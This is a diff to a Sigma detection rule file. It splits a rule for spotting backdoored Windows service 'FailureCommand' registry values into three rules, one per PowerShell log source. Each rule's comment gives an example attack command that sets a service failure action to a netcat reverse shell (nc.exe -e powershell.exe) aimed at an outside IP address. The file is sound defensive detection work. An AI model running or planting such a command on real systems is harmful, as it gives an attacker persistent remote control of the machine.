@@ -1,4 +1,8 @@
-title: Service abuse with backdoored "command failure" (Reg via PowerShell)
+title: Service abuse with backdoored "command failure" (Reg via PowerShell) - ps_module
+id: c8039421-8bc5-4929-a9ab-f6871214713b
+related:
+  - id: 841a321b-564d-4692-86c7-a596f17a5ccf
+    type: similar
 description: Detects scenarios where an attacker modify the configuration of a service to trigger an action when the service is crashed.
 references:
 - https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
@@ -12,10 +16,40 @@ author: mdecrevoisier
 status: experimental
 logsource:
   product: windows
-  category:
-    - ps_module
-    - ps_classic_script
-    - ps_script
+  category: ps_module
+detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
+  selection_powershell_modern:
+    EventID: 4103
+    Payload|contains|all:
+      - '-ItemProperty' # Can be New-* or Set-*
+      - '\SYSTEM\CurrentControlSet\Services\'
+      - FailureCommand
+
+  condition: 1 of selection*
+falsepositives:
+- administrator reconfiguring service
+level: high
+
+---
+title: Service abuse with backdoored "command failure" (Reg via PowerShell) - ps_classic_script
+id: 9f8b52ee-ac2a-4578-b1a2-1e19bd1d476b
+related:
+  - id: c8039421-8bc5-4929-a9ab-f6871214713b
+    type: similar
+description: Detects scenarios where an attacker modify the configuration of a service to trigger an action when the service is crashed.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
+- https://twitter.com/JohnLaTwC/status/1432689635122159623?s=09
+- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742019(v=ws.11)
+- https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/
+tags:
+- attack.persistence
+- attack.t1543.003
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: ps_classic_script
 detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
   selection_powershell_native:
     EventID: 800
@@ -24,13 +58,32 @@ detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xbox
       - '\SYSTEM\CurrentControlSet\Services\'
       - FailureCommand
 
-  selection_powershell_modern:
-    EventID: 4103
-    Payload|contains|all:
-      - '-ItemProperty' # Can be New-* or Set-*
-      - '\SYSTEM\CurrentControlSet\Services\'
-      - FailureCommand
+  condition: 1 of selection*
+falsepositives:
+- administrator reconfiguring service
+level: high
 
+---
+title: Service abuse with backdoored "command failure" (Reg via PowerShell) - ps_script
+id: 05738e29-680b-4ddc-9b6b-9a045f6985ef
+related:
+  - id: c8039421-8bc5-4929-a9ab-f6871214713b
+    type: similar
+description: Detects scenarios where an attacker modify the configuration of a service to trigger an action when the service is crashed.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
+- https://twitter.com/JohnLaTwC/status/1432689635122159623?s=09
+- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742019(v=ws.11)
+- https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/
+tags:
+- attack.persistence
+- attack.t1543.003
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: ps_script
+detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
   selection_powershell_block:
     EventID: 4104
     ScriptBlockText|contains|all:
